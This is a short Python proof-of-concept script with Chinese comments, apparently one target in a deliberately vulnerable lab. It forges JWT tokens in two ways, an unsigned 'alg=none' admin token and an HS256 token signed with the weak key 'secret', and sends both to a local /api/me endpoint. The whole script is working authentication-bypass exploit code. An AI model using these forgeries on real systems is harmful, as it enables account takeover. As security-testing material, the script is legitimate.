"""靶点 5：JWT alg=none + 弱密钥伪造。仅 vulnerable profile 下生效。"""
import base64, hmac, hashlib, json, time, httpx

def b64(b: bytes) -> bytes:
    return base64.urlsafe_b64encode(b).rstrip(b"=")

# A: alg=none 伪造 admin
header = b64(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64(json.dumps({"sub": "admin",
                          "exp": int(time.time()) + 3600}).encode())
none_token = f"{header.decode()}.{payload.decode()}."

# B: 弱密钥 "secret" 签 HS256 伪造
def sign_hs256(secret: str, sub: str) -> str:
    h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    p = b64(json.dumps({"sub": sub,
                        "exp": int(time.time()) + 3600}).encode())
    sig = hmac.new(secret.encode(), f"{h.decode()}.{p.decode()}".encode(),
                   hashlib.sha256).digest()
    return f"{h.decode()}.{p.decode()}.{b64(sig).decode()}"

forged = sign_hs256("secret", "alice")

with httpx.Client(base_url="http://localhost:8080") as c:
    for label, tok in [("alg=none", none_token), ("\u5f31\u5bc6\u94a5\u4f2a\u9020", forged)]:
        r = c.get("/api/me", headers={"Authorization": f"Bearer {tok}"})
        print(f"{label} -> {r.status_code} {r.text}")
